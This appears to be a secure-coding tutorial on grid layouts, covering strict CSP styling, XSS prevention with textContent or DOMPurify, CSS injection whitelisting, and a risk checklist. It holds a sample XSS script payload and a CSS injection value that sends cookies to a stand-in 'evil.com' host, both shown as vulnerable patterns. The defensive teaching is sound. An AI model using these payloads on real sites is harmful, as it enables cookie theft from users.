03_01_08 - Grid Security Patterns

1. Content Security Policy (CSP) Compliant Grid

Rule: All styles must be in external stylesheets. No inline styles (style="...") on grid items. Use CSS classes for variants instead. This is required for strict CSP headers: Content-Security-Policy: style-src 'self'
Primary (class-based)
Success (class-based)
Warning (class-based)
Danger (class-based)
WRONG (CSP violation): <div style="background: red;"> — Inline styles are blocked by strict CSP. Always use classes.

2. XSS Prevention in Dynamic Grid Content

When grid items are rendered from user input (comments, profiles, etc.), never use innerHTML with unsanitized data. Use textContent or a DOM sanitizer library.
Unsafe (XSS vulnerable)
// DANGEROUS - never do this
card.innerHTML = userInput;
// If userInput = "<script>alert('xss')</script>"
// The script executes!
Safe (XSS prevented)
// SAFE - use textContent
card.textContent = userInput;
// Script tags are displayed as text,
// not executed.

// Or use DOMPurify for HTML content:
card.innerHTML = DOMPurify.sanitize(
  userInput
);

5. CSS Injection Prevention

Allowing user input in CSS (e.g., custom theme colors) can lead to CSS injection attacks. Always validate and restrict values to a whitelist.
Vulnerable Pattern:
// DANGEROUS - user controls CSS value
element.style.backgroundColor = userColor;
// If userColor = "red; background-image: url('https://evil.com/steal?cookie=...')"
// Data exfiltration via CSS!
Safe Pattern:
// SAFE - whitelist allowed values
const allowedColors = {
  'primary': '#0d6efd',
  'success': '#198754',
  'danger': '#dc3545'
};
const safeColor = allowedColors[userColor] || '#6c757d';
element.style.backgroundColor = safeColor;

6. Grid Security Checklist

Risk Mitigation Priority
XSS via innerHTML Use textContent or DOMPurify.sanitize() Critical
CSP violation (inline styles) All styles in external CSS files, use classes High
CSS injection Whitelist user-controllable CSS values High
Client-side permission hiding Enforce permissions server-side, don't render Critical
Unescaped HTML entities Use server-side escaping (htmlspecialchars, etc.) Critical
Third-party CDN integrity Use SRI hashes on script/link tags High
